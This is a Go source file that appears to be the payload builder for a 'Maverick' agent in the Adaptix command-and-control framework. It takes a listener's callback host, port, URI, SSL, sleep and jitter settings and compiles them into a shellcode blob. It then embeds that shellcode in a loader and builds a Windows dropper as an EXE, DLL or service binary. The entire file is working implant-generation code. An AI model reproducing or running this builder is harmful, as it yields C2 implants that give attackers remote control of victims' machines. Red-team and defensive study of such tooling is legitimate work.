package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/google/uuid"

	ax "github.com/Adaptix-Framework/axc2"
)

func buildLog(builderId string, status int, format string, args ...interface{}) {
	_ = ModuleObject.ts.TsAgentBuildLog(builderId, status, fmt.Sprintf(format, args...))
}

func buildExec(builderId string, workDir string, program string, args ...string) error {
	return ModuleObject.ts.TsAgentBuildExecute(builderId, workDir, program, args...)
}

func AgentGenerateBuild(builderId string, agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {

	var cfg AgentConfig
	if err := json.Unmarshal([]byte(agentConfig), &cfg); err != nil {
		return nil, "", fmt.Errorf("failed to parse agentConfig: %v", err)
	}

	format := cfg.Format
	if format == "" {
		format = "Exe"
	}
	target := "x64"
	if cfg.Debug {
		target = "x64-debug"
	}

	displayTag := "HTTP"
	if cfg.Debug {
		displayTag += "-Debug"
	}

	wd, err := os.Getwd()
	if err != nil {
		return nil, "", fmt.Errorf("failed to get working directory: %v", err)
	}

	targetPath := filepath.Join(filepath.Dir(wd), "dist", "extenders", "maverick", "src_beacon")
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		return nil, "", fmt.Errorf("target path not found: %s", targetPath)
	}

	sslEnabled := false
	if s, ok := listenerMap["ssl"].(bool); ok {
		sslEnabled = s
	} else if s2, ok := listenerMap["ssl"].(string); ok {
		sslEnabled = (s2 == "1" || strings.EqualFold(s2, "true"))
	}

	callbackHost := ""
	if h, ok := listenerMap["host_bind"].(string); ok {
		callbackHost = h
	}
	// Use addresses field if available (resolved IP:port)
	if addr, ok := listenerMap["addresses"].(string); ok && addr != "" {
		parts := strings.SplitN(addr, ":", 2)
		if len(parts) >= 1 {
			callbackHost = parts[0]
		}
	}

	callbackPort := 0
	if p, ok := listenerMap["port_bind"].(float64); ok {
		callbackPort = int(p)
	}

	callbackUri := "/"
	if u, ok := listenerMap["uri"].(string); ok && u != "" {
		callbackUri = u
	}

	mvSleep := cfg.Sleep
	if mvSleep == "" {
		mvSleep = "3"
	} else {
		mvSleep = strings.TrimSuffix(mvSleep, "s")
	}

	agentUUID := uuid.New().String()
	makeVars := []string{
		fmt.Sprintf("MV_AGENT_UUID=%s", agentUUID),
		fmt.Sprintf("MV_SLEEP_TIME=%s", mvSleep),
		fmt.Sprintf("MV_JITTER=%d", cfg.Jitter),
		fmt.Sprintf("MV_CALLBACK_HOST=%s", callbackHost),
		fmt.Sprintf("MV_CALLBACK_PORT=%d", callbackPort),
		fmt.Sprintf("MV_CALLBACK_URI=%s", callbackUri),
		fmt.Sprintf("MV_CALLBACK_SSL=%d", bool_to_int(sslEnabled)),
	}

	// Step 1: Compile COFF objects
	buildLog(builderId, ax.BUILD_LOG_INFO, "[make] compiling COFF objects...")

	cleanArgs := append([]string{"--no-print-directory", "-C", targetPath, "clean"}, makeVars...)
	if err := buildExec(builderId, "", "make", cleanArgs...); err != nil {
		return nil, "", fmt.Errorf("make clean failed: %v", err)
	}

	buildArgs := append([]string{"--no-print-directory", "-C", targetPath, target}, makeVars...)
	if err := buildExec(builderId, "", "make", buildArgs...); err != nil {
		return nil, "", fmt.Errorf("make failed: %v", err)
	}

	buildLog(builderId, ax.BUILD_LOG_SUCCESS, "[make] COFF objects ready")

	buildLog(builderId, ax.BUILD_LOG_INFO, "[config] format: %s | target: %s", format, target)
	buildLog(builderId, ax.BUILD_LOG_INFO, "[config] callback: %s:%d%s (ssl=%v)", callbackHost, callbackPort, callbackUri, sslEnabled)
	buildLog(builderId, ax.BUILD_LOG_INFO, "[config] sleep: %ss | jitter: %d%%", mvSleep, cfg.Jitter)

	// Step 2: Crystal Palace link
	buildLog(builderId, ax.BUILD_LOG_INFO, "[link] crystal palace PIC linker...")

	linkTool := filepath.Join(targetPath, "crystal-palace", "link")
	os.MkdirAll(filepath.Join(targetPath, "Bin"), 0755)

	// Discover module .o files
	objDir := filepath.Join(targetPath, "Bin", "obj")
	var moduleObjs []string
	filepath.WalkDir(objDir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if strings.HasSuffix(d.Name(), ".x64.o") && d.Name() != "main.x64.o" {
			rel, _ := filepath.Rel(targetPath, path)
			moduleObjs = append(moduleObjs, rel)
		}
		return nil
	})

	// Discover libs
	var libObjs []string
	for _, libDir := range []string{"libtcg"} {
		libPath := filepath.Join(targetPath, libDir)
		if entries, err := os.ReadDir(libPath); err == nil {
			for _, e := range entries {
				if !e.IsDir() && strings.HasSuffix(e.Name(), ".zip") {
					libObjs = append(libObjs, libDir+"/"+e.Name())
				}
			}
		}
	}

	modulesList := strings.Join(moduleObjs, ",")
	libsList := strings.Join(libObjs, ",")

	buildLog(builderId, ax.BUILD_LOG_INFO, "[link] modules: %d | libs: %d", len(moduleObjs), len(libObjs))

	linkArgs := []string{
		"agent.spec", "Bin/obj/main.x64.o", "Bin/agent.bin",
		fmt.Sprintf("%%ENTRY=%s", "Bin/obj/main.x64.o"),
		fmt.Sprintf("%%MODULES=%s", modulesList),
		fmt.Sprintf("%%LIBS=%s", libsList),
	}

	if err := buildExec(builderId, targetPath, linkTool, linkArgs...); err != nil {
		return nil, "", fmt.Errorf("Crystal Palace link failed: %v", err)
	}

	outputFile := filepath.Join(targetPath, "Bin", "agent.bin")
	picBlob, err := os.ReadFile(outputFile)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read PIC blob: %v", err)
	}

	buildLog(builderId, ax.BUILD_LOG_SUCCESS, "[link] PIC payload: %d bytes", len(picBlob))

	if format == "Bin" {
		outFileName := fmt.Sprintf("Maverick.%s.bin", displayTag)
		buildLog(builderId, ax.BUILD_LOG_SUCCESS, "[done] %s | %d bytes", outFileName, len(picBlob))
		return picBlob, outFileName, nil
	}

	// Step 3: Generate Shellcode.h
	buildLog(builderId, ax.BUILD_LOG_INFO, "[inject] embedding shellcode into loader...")

	loaderIncludePath := filepath.Join(targetPath, "loader", "Include")
	shellcodeHeaderPath := filepath.Join(loaderIncludePath, "Shellcode.h")
	shellcodeContent := gen_shellcode_header(picBlob)
	if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
		return nil, "", fmt.Errorf("failed to write Shellcode.h: %v", err)
	}

	// Step 4: Compile final binary
	buildLog(builderId, ax.BUILD_LOG_INFO, "[compile] building %s dropper...", format)

	loaderSourcePath := filepath.Join(targetPath, "loader", "Source")

	var sourcePath string
	var outputPath string
	var outFileName string
	var extraFlags []string

	switch format {
	case "Exe":
		sourcePath = filepath.Join(loaderSourcePath, "Exe.cc")
		outputPath = filepath.Join(targetPath, "Bin", "Maverick.x64.exe")
		outFileName = fmt.Sprintf("Maverick.%s.exe", displayTag)
		extraFlags = append(extraFlags, "-Wl,-e,WinMain")
	case "Dll":
		sourcePath = filepath.Join(loaderSourcePath, "Dll.cc")
		outputPath = filepath.Join(targetPath, "Bin", "Maverick.x64.dll")
		outFileName = fmt.Sprintf("Maverick.%s.dll", displayTag)
		extraFlags = append(extraFlags, "-shared", "-Wl,-e,DllMain")
	case "Svc":
		sourcePath = filepath.Join(loaderSourcePath, "Svc.cc")
		outputPath = filepath.Join(targetPath, "Bin", "Maverick.x64.exe")
		outFileName = fmt.Sprintf("Maverick.%s.svc.exe", displayTag)
		extraFlags = append(extraFlags, "-Wl,-e,WinMain")
	default:
		return nil, "", fmt.Errorf("unknown format: %s", format)
	}

	subsystem := "-mwindows"
	if cfg.Debug {
		subsystem = "-mconsole"
	}

	clangArgs := []string{
		"-target", "x86_64-w64-mingw32",
		"-I", loaderIncludePath,
		"-o", outputPath,
		sourcePath,
		"-Os",
		"-fno-builtin",
		subsystem,
		"-nostdlib",
		"-s",
		"-lkernel32",
		"-ladvapi32",
		"-luser32",
	}

	if cfg.Debug {
		clangArgs = append(clangArgs, "-DMV_DEBUG")
	}

	clangArgs = append(clangArgs, extraFlags...)

	if err := buildExec(builderId, targetPath, "clang++", clangArgs...); err != nil {
		return nil, "", fmt.Errorf("clang++ failed: %v", err)
	}

	finalBin, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read final binary: %v", err)
	}

	buildLog(builderId, ax.BUILD_LOG_SUCCESS, "[done] %s | %d bytes", outFileName, len(finalBin))

	return finalBin, outFileName, nil
}
